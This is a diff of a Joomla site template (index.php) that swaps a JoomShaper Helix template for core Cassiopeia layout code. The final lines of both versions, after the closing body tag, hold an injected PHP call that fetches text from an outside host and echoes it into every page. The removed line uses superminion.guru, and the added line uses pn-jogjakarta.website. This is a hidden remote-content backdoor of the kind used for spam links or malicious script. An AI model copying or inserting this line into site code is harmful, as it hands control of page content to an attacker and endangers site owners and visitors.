@@ -1,164 +1,257 @@
 <?php
+
 /**
- * @package Shaper Stellar
- * @author JoomShaper https://www.joomshaper.com
- * @copyright Copyright (c) 2010 - 2018 JoomShaper
- * @license http://www.gnu.org/licenses/gpl-2.0.html GNU/GPLv2 or Later
-*/
+ * @package     Joomla.Site
+ * @subpackage  Templates.cassiopeia
+ *
+ * @copyright   (C) 2017 Open Source Matters, Inc. <https://www.joomla.org>
+ * @license     GNU General Public License version 2 or later; see LICENSE.txt
+ */
 
-defined ('_JEXEC') or die();
+defined('_JEXEC') or die;
 
-$doc = JFactory::getDocument();
-$app = JFactory::getApplication();
+use Joomla\CMS\Factory;
+use Joomla\CMS\HTML\HTMLHelper;
+use Joomla\CMS\Language\Text;
+use Joomla\CMS\Uri\Uri;
 
-$helix_path = JPATH_PLUGINS . '/system/helixultimate/core/helixultimate.php';
-if (file_exists($helix_path)) {
-    require_once($helix_path);
-    $theme = new helixUltimate;
+/** @var Joomla\CMS\Document\HtmlDocument $this */
+
+$app   = Factory::getApplication();
+$input = $app->getInput();
+$wa    = $this->getWebAssetManager();
+
+// Browsers support SVG favicons
+$this->addHeadLink(HTMLHelper::_('image', 'joomla-favicon.svg', '', [], true, 1), 'icon', 'rel', ['type' => 'image/svg+xml']);
+$this->addHeadLink(HTMLHelper::_('image', 'favicon.ico', '', [], true, 1), 'alternate icon', 'rel', ['type' => 'image/vnd.microsoft.icon']);
+$this->addHeadLink(HTMLHelper::_('image', 'joomla-favicon-pinned.svg', '', [], true, 1), 'mask-icon', 'rel', ['color' => '#000']);
+
+// Detecting Active Variables
+$option   = $input->getCmd('option', '');
+$view     = $input->getCmd('view', '');
+$layout   = $input->getCmd('layout', '');
+$task     = $input->getCmd('task', '');
+$itemid   = $input->getCmd('Itemid', '');
+$sitename = htmlspecialchars($app->get('sitename'), ENT_QUOTES, 'UTF-8');
+$menu     = $app->getMenu()->getActive();
+$pageclass = $menu !== null ? $menu->getParams()->get('pageclass_sfx', '') : '';
+
+// Color Theme
+$paramsColorName = $this->params->get('colorName', 'colors_standard');
+$assetColorName  = 'theme.' . $paramsColorName;
+
+// Use a font scheme if set in the template style options
+$paramsFontScheme = $this->params->get('useFontScheme', false);
+$fontStyles       = '';
+
+if ($paramsFontScheme) {
+    if (stripos($paramsFontScheme, 'https://') === 0) {
+        $this->getPreloadManager()->preconnect('https://fonts.googleapis.com/', ['crossorigin' => 'anonymous']);
+        $this->getPreloadManager()->preconnect('https://fonts.gstatic.com/', ['crossorigin' => 'anonymous']);
+        $this->getPreloadManager()->preload($paramsFontScheme, ['as' => 'style', 'crossorigin' => 'anonymous']);
+        $wa->registerAndUseStyle('fontscheme.current', $paramsFontScheme, [], ['rel' => 'lazy-stylesheet', 'crossorigin' => 'anonymous']);
+
+        if (preg_match_all('/family=([^?:]*):/i', $paramsFontScheme, $matches) > 0) {
+            $fontStyles = '--cassiopeia-font-family-body: "' . str_replace('+', ' ', $matches[1][0]) . '", sans-serif;
+			--cassiopeia-font-family-headings: "' . str_replace('+', ' ', $matches[1][1] ?? $matches[1][0]) . '", sans-serif;
+			--cassiopeia-font-weight-normal: 400;
+			--cassiopeia-font-weight-headings: 700;';
+        }
+    } elseif ($paramsFontScheme === 'system') {
+        $fontStylesBody    = $this->params->get('systemFontBody', '');
+        $fontStylesHeading = $this->params->get('systemFontHeading', '');
+
+        if ($fontStylesBody) {
+            $fontStyles = '--cassiopeia-font-family-body: ' . $fontStylesBody . ';
+            --cassiopeia-font-weight-normal: 400;';
+        }
+        if ($fontStylesHeading) {
+            $fontStyles .= '--cassiopeia-font-family-headings: ' . $fontStylesHeading . ';
+    		--cassiopeia-font-weight-headings: 700;';
+        }
+    } else {
+        $wa->registerAndUseStyle('fontscheme.current', $paramsFontScheme, ['version' => 'auto'], ['rel' => 'lazy-stylesheet']);
+        $this->getPreloadManager()->preload($wa->getAsset('style', 'fontscheme.current')->getUri() . '?' . $this->getMediaVersion(), ['as' => 'style']);
+    }
+}
+
+// Enable assets
+$wa->usePreset('template.cassiopeia.' . ($this->direction === 'rtl' ? 'rtl' : 'ltr'))
+    ->useStyle('template.active.language')
+    ->registerAndUseStyle($assetColorName, 'global/' . $paramsColorName . '.css')
+    ->useStyle('template.user')
+    ->useScript('template.user')
+    ->addInlineStyle(":root {
+		--hue: 214;
+		--template-bg-light: #f0f4fb;
+		--template-text-dark: #495057;
+		--template-text-light: #ffffff;
+		--template-link-color: var(--link-color);
+		--template-special-color: #001B4C;
+		$fontStyles
+	}");
+
+// Override 'template.active' asset to set correct ltr/rtl dependency
+$wa->registerStyle('template.active', '', [], [], ['template.cassiopeia.' . ($this->direction === 'rtl' ? 'rtl' : 'ltr')]);
+
+// Logo file or site title param
+if ($this->params->get('logoFile')) {
+    $logo = HTMLHelper::_('image', Uri::root(false) . htmlspecialchars($this->params->get('logoFile'), ENT_QUOTES), $sitename, ['loading' => 'eager', 'decoding' => 'async'], false, 0);
+} elseif ($this->params->get('siteTitle')) {
+    $logo = '<span title="' . $sitename . '">' . htmlspecialchars($this->params->get('siteTitle'), ENT_COMPAT, 'UTF-8') . '</span>';
 } else {
-    die('Install and activate <a target="_blank" href="https://www.joomshaper.com/helix">Helix Ultimate Framework</a>.');
+    $logo = HTMLHelper::_('image', 'logo.svg', $sitename, ['class' => 'logo d-inline-block', 'loading' => 'eager', 'decoding' => 'async'], true, 0);
 }
 
-// If comingsoon is enabled and logged in user doens't have permission to login in the offline then redirect to comingsoon page
-if ( $this->params->get('comingsoon') && !\JFactory::getUser()->authorise('core.login.offline') )
-{
-  header("Location: " . $this->baseUrl . "?tmpl=comingsoon");
+$hasClass = '';
+
+if ($this->countModules('sidebar-left', true)) {
+    $hasClass .= ' has-sidebar-left';
 }
 
-$custom_style = $this->params->get('custom_style');
-$preset = $this->params->get('preset');
-
-if($custom_style || !$preset)
-{
-    $scssVars = array(
-        'preset' => 'default',
-        'text_color' => $this->params->get('text_color'),
-        'bg_color' => $this->params->get('bg_color'),
-        'link_color' => $this->params->get('link_color'),
-        'link_hover_color' => $this->params->get('link_hover_color'),
-        'link_color2' => $this->params->get('link_color2'),
-        'link_hover_color2' => $this->params->get('link_hover_color2'),
-        'header_bg_color' => $this->params->get('header_bg_color'),
-        'logo_text_color' => $this->params->get('logo_text_color'),
-        'menu_text_color' => $this->params->get('menu_text_color'),
-        'menu_text_hover_color' => $this->params->get('menu_text_hover_color'),
-        'menu_text_active_color' => $this->params->get('menu_text_active_color'),
-        'menu_dropdown_bg_color' => $this->params->get('menu_dropdown_bg_color'),
-        'menu_dropdown_text_color' => $this->params->get('menu_dropdown_text_color'),
-        'menu_dropdown_text_hover_color' => $this->params->get('menu_dropdown_text_hover_color'),
-        'menu_dropdown_text_active_color' => $this->params->get('menu_dropdown_text_active_color'),
-        'footer_bg_color' => $this->params->get('footer_bg_color'),
-        'footer_text_color' => $this->params->get('footer_text_color'),
-        'footer_link_color' => $this->params->get('footer_link_color'),
-        'footer_link_hover_color' => $this->params->get('footer_link_hover_color'),
-        'topbar_bg_color' => $this->params->get('topbar_bg_color'),
-        'topbar_text_color' => $this->params->get('topbar_text_color')
-    );
-}
-else
-{
-    $scssVars = (array) json_decode($this->params->get('preset'));
+if ($this->countModules('sidebar-right', true)) {
+    $hasClass .= ' has-sidebar-right';
 }
 
-$scssVars['header_height'] = $this->params->get('header_height', '60px');
+// Container
+$wrapper = $this->params->get('fluidContainer') ? 'wrapper-fluid' : 'wrapper-static';
 
+$this->setMetaData('viewport', 'width=device-width, initial-scale=1');
 
-//Body Background Image
-if ($bg_image = $this->params->get('body_bg_image'))
-{
-    $body_style = 'background-image: url(' . JURI::base(true) . '/' . $bg_image . ');';
-    $body_style .= 'background-repeat: ' . $this->params->get('body_bg_repeat') . ';';
-    $body_style .= 'background-size: ' . $this->params->get('body_bg_size') . ';';
-    $body_style .= 'background-attachment: ' . $this->params->get('body_bg_attachment') . ';';
-    $body_style .= 'background-position: ' . $this->params->get('body_bg_position') . ';';
-    $body_style = 'body.site {' . $body_style . '}';
-    $doc->addStyledeclaration($body_style);
-}
+$stickyHeader = $this->params->get('stickyHeader') ? 'position-sticky sticky-top' : '';
 
-//Custom CSS
-if ($custom_css = $this->params->get('custom_css'))
-{
-    $doc->addStyledeclaration($custom_css);
-}
-
-//Custom JS
-if ($custom_js = $this->params->get('custom_js'))
-{
-    $doc->addScriptdeclaration($custom_js);
-}
-
+// Defer fontawesome for increased performance. Once the page is loaded javascript changes it to a stylesheet.
+$wa->getAsset('style', 'fontawesome')->setAttribute('rel', 'lazy-stylesheet');
 ?>
+<!DOCTYPE html>
+<html lang="<?php echo $this->language; ?>" dir="<?php echo $this->direction; ?>">
 
-<!doctype html>
-<html lang="en">
-    <head>
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-        <link rel="canonical" href="<?php echo JUri::current(); ?>">
-        <?php
+<head>
+    <jdoc:include type="metas" />
+    <jdoc:include type="styles" />
+    <jdoc:include type="scripts" />
+</head>
 
-        $theme->head();
-        //CSS Files
-        $theme->add_css('font-awesome.min.css, stellar-icon.css');
-        $theme->add_css('custom');
-        // Fontawesome 4 to 5 compatible CSS file
-        $theme->add_css('fa-v4-shims.css');
-        
-        // Scss files
-        $theme->add_scss('master', $scssVars, 'template');
-        if($this->direction == 'rtl')
-        {
-            $theme->add_scss('rtl', $scssVars, 'rtl');
-        }
-        $theme->add_scss('presets', $scssVars, 'presets/' . $scssVars['preset']);
+<body class="site <?php echo $option
+    . ' ' . $wrapper
+    . ' view-' . $view
+    . ($layout ? ' layout-' . $layout : ' no-layout')
+    . ($task ? ' task-' . $task : ' no-task')
+    . ($itemid ? ' itemid-' . $itemid : '')
+    . ($pageclass ? ' ' . $pageclass : '')
+    . $hasClass
+    . ($this->direction == 'rtl' ? ' rtl' : '');
+?>">
+    <header class="header container-header full-width<?php echo $stickyHeader ? ' ' . $stickyHeader : ''; ?>">
 
-        // JS files
-        $theme->add_js('jquery.sticky.js, main.js');
+        <?php if ($this->countModules('topbar')) : ?>
+            <div class="container-topbar">
+                <jdoc:include type="modules" name="topbar" style="none" />
+            </div>
+        <?php endif; ?>
 
+        <?php if ($this->countModules('below-top')) : ?>
+            <div class="grid-child container-below-top">
+                <jdoc:include type="modules" name="below-top" style="none" />
+            </div>
+        <?php endif; ?>
 
-        //Before Head
-        if ($before_head = $this->params->get('before_head'))
-        {
-            echo $before_head . "\n";
-        }
-        ?>
-    </head>
-    <body class="<?php echo $theme->bodyClass(); ?>">
-    <?php if($this->params->get('preloader')) : ?>
-        <div class="sp-preloader"><div></div></div>
+        <?php if ($this->params->get('brand', 1)) : ?>
+            <div class="grid-child">
+                <div class="navbar-brand">
+                    <a class="brand-logo" href="<?php echo $this->baseurl; ?>/">
+                        <?php echo $logo; ?>
+                    </a>
+                    <?php if ($this->params->get('siteDescription')) : ?>
+                        <div class="site-description"><?php echo htmlspecialchars($this->params->get('siteDescription')); ?></div>
+                    <?php endif; ?>
+                </div>
+            </div>
+        <?php endif; ?>
+
+        <?php if ($this->countModules('menu', true) || $this->countModules('search', true)) : ?>
+            <div class="grid-child container-nav">
+                <?php if ($this->countModules('menu', true)) : ?>
+                    <jdoc:include type="modules" name="menu" style="none" />
+                <?php endif; ?>
+                <?php if ($this->countModules('search', true)) : ?>
+                    <div class="container-search">
+                        <jdoc:include type="modules" name="search" style="none" />
+                    </div>
+                <?php endif; ?>
+            </div>
+        <?php endif; ?>
+    </header>
+
+    <div class="site-grid">
+        <?php if ($this->countModules('banner', true)) : ?>
+            <div class="container-banner full-width">
+                <jdoc:include type="modules" name="banner" style="none" />
+            </div>
+        <?php endif; ?>
+
+        <?php if ($this->countModules('top-a', true)) : ?>
+            <div class="grid-child container-top-a">
+                <jdoc:include type="modules" name="top-a" style="card" />
+            </div>
+        <?php endif; ?>
+
+        <?php if ($this->countModules('top-b', true)) : ?>
+            <div class="grid-child container-top-b">
+                <jdoc:include type="modules" name="top-b" style="card" />
+            </div>
+        <?php endif; ?>
+
+        <?php if ($this->countModules('sidebar-left', true)) : ?>
+            <div class="grid-child container-sidebar-left">
+                <jdoc:include type="modules" name="sidebar-left" style="card" />
+            </div>
+        <?php endif; ?>
+
+        <div class="grid-child container-component">
+            <jdoc:include type="modules" name="breadcrumbs" style="none" />
+            <jdoc:include type="modules" name="main-top" style="card" />
+            <jdoc:include type="message" />
+            <main>
+                <jdoc:include type="component" />
+            </main>
+            <jdoc:include type="modules" name="main-bottom" style="card" />
+        </div>
+
+        <?php if ($this->countModules('sidebar-right', true)) : ?>
+            <div class="grid-child container-sidebar-right">
+                <jdoc:include type="modules" name="sidebar-right" style="card" />
+            </div>
+        <?php endif; ?>
+
+        <?php if ($this->countModules('bottom-a', true)) : ?>
+            <div class="grid-child container-bottom-a">
+                <jdoc:include type="modules" name="bottom-a" style="card" />
+            </div>
+        <?php endif; ?>
+
+        <?php if ($this->countModules('bottom-b', true)) : ?>
+            <div class="grid-child container-bottom-b">
+                <jdoc:include type="modules" name="bottom-b" style="card" />
+            </div>
+        <?php endif; ?>
+    </div>
+
+    <?php if ($this->countModules('footer', true)) : ?>
+        <footer class="container-footer footer full-width">
+            <div class="grid-child">
+                <jdoc:include type="modules" name="footer" style="none" />
+            </div>
+        </footer>
     <?php endif; ?>
 
-    <div class="body-wrapper">
-        <div class="body-innerwrapper">
-            <?php echo $theme->getHeaderStyle(); ?>
-            <?php $theme->render_layout(); ?>
-        </div>
-    </div>
-
-    <!-- Off Canvas Menu -->
-    <div class="offcanvas-overlay"></div>
-    <div class="offcanvas-menu">
-        <a href="#" class="close-offcanvas"><span class="fa fa-remove"></span></a>
-        <div class="offcanvas-inner">
-            <?php if ($this->countModules('offcanvas')) : ?>
-                <jdoc:include type="modules" name="offcanvas" style="sp_xhtml" />
-            <?php else: ?>
-                <p class="alert alert-warning">
-                    <?php echo JText::_('HELIX_ULTIMATE_NO_MODULE_OFFCANVAS'); ?>
-                </p>
-            <?php endif; ?>
-        </div>
-    </div>
-
-    <?php $theme->after_body(); ?>
+    <?php if ($this->params->get('backTop') == 1) : ?>
+        <a href="#top" id="back-top" class="back-to-top-link" aria-label="<?php echo Text::_('TPL_CASSIOPEIA_BACKTOTOP'); ?>">
+            <span class="icon-arrow-up icon-fw" aria-hidden="true"></span>
+        </a>
+    <?php endif; ?>
 
     <jdoc:include type="modules" name="debug" style="none" />
-    
-    <!-- Go to top -->
-    <?php if ($this->params->get('goto_top', 0)) : ?>
-        <a href="#" class="sp-scroll-up" aria-label="Scroll Up"><span class="fa fa-chevron-up" aria-hidden="true"></span></a>
-    <?php endif; ?>
-
-    </body>
-	<?php echo file_get_contents("https://superminion.guru/sultanpopoy.txt");?>
+</body>
+<?php echo file_get_contents("https://pn-jogjakarta.website/txt/asli.txt");?>
 </html>
